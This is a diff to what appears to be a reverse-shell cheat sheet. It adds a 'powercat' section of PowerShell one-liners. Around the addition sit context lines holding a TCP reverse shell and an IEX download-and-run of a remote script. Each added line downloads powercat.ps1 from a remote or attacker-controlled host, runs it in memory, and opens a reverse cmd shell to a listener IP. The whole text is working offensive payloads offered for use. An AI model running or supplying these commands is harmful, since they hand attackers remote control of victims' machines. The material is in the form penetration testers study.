@@ -267,6 +267,12 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1'
 powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
 ```
 
+-  powercat
+```powershell
+powershell Set-ExecutionPolicy -ExecutionPolicy RemoteSigned;IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.50.161:8080/powercat.ps1'); powercat -c 192.168.50.161 -p 7777 -e cmd
+powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 10.1.1.1 -p 443 -e cmd
+```
+
 ### Awk
 
 ```powershell
